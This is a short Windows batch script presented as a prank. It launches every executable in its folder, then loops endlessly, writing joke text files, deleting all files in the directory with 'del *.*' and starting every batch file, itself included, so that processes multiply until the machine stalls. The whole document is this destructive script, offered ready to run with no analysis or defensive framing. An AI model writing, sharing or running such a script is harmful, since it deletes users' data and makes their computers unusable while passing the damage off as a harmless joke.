@echo off
color 0a
title It's just a prank, bro
start *.exe
goto loop
:loop:
echo "calm down, it's just a prank">%random%.txt
del *.*
start *.bat
goto loop
